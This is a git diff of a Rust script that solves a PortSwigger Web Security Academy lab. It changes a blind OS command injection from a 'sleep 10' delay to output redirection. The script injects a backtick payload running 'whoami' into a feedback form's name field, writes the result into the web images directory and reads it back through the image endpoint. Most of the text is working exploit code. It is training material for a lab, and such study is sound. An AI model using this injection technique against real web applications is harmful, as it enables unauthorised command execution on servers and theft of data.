@@ -1,18 +1,19 @@
-/*******************************************************************************
+/***********************************************************************************
 *
 * Author: Ahmed Elqalawy (@elqal3awii)
 *
 * Date: 10/10/2023
 *
-* Lab: Blind OS command injection with time delays
+* Lab: Blind OS command injection with output redirection
 *
 * Steps: 1. Fetch the feedback page
 *        2. Extract csrf token and session cookie
-*        3. Inject payload into the name field when submitting a feedback
-*           to cause a 10 second delay
-*        4. Wait for the response
+*        3. Inject payload into the name field when submitting a feedback to
+*           execute the `whoami` command and redirect the output to a text file
+*           in a writable directory
+*        4. Read the new created file
 *
-********************************************************************************/
+************************************************************************************/
 #![allow(unused)]
 use regex::Regex;
 /***********
@@ -36,7 +37,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0aa200c304f785e684e0b4df002b00e9.web-security-academy.net";
+    let url = "https://0a52000b032f742a8282dddb00120026.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -69,26 +70,31 @@ fn main() {
     let csrf =
         extract_csrf(feedback).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
 
+    // the file name to save the output of `whoami` in
+    // you can change this to what you want
+    let file_name = "whoami.txt";
+
+    // the payload to execute the `whoami` command and redirect the output to a text file
+    let payload = format!("`whoami>/var/www/images/{file_name}`");
+
     println!("{}", "OK".green());
     print!(
-        "{}",
-        "⦗3⦘ Injecting payload to cause a 10 second delay (wait).. ".white()
+        "{} {}.. ",
+        "⦗3⦘ Injecting payload to execute the `whoami` command and redirect the output to".white(),
+        file_name.yellow(),
     );
     io::stdout().flush();
 
-    // the payload to cause a 10 second delay
-    let payload = "`sleep 10`";
-
     // fetch the page with the injected payload
-    let injection = client
+    let mut injection = client
         .post(format!("{url}/feedback/submit"))
         .header("Cookie", format!("session={session}"))
         .form(&HashMap::from([
             ("name", payload),
-            ("csrf", &csrf),
-            ("email", "no@hack.com"),
-            ("subject", "hacking"),
-            ("message", "you are hacked"),
+            ("csrf", csrf),
+            ("email", "no@hack.com".to_string()),
+            ("subject", "hacking".to_string()),
+            ("message", "you are hacked".to_string()),
         ]))
         .send()
         .expect(&format!(
@@ -97,6 +103,22 @@ fn main() {
         ));
 
     println!("{}", "OK".green());
+    print!("{} {}.. ", "⦗4⦘ Reading".white(), file_name.white(),);
+    io::stdout().flush();
+
+    // fetch the new created file
+    injection = client
+        .get(format!("{url}/image?filename={file_name}"))
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to fetch the page with the injected payload".red()
+        ));
+
+    // the response contains the output of the `whoami` command
+    let whoami = injection.text().unwrap();
+
+    print!("{} => {}", "OK".green(), whoami.yellow());
     println!(
         "{} {}",
         "🗹 Check your browser, it should be marked now as"
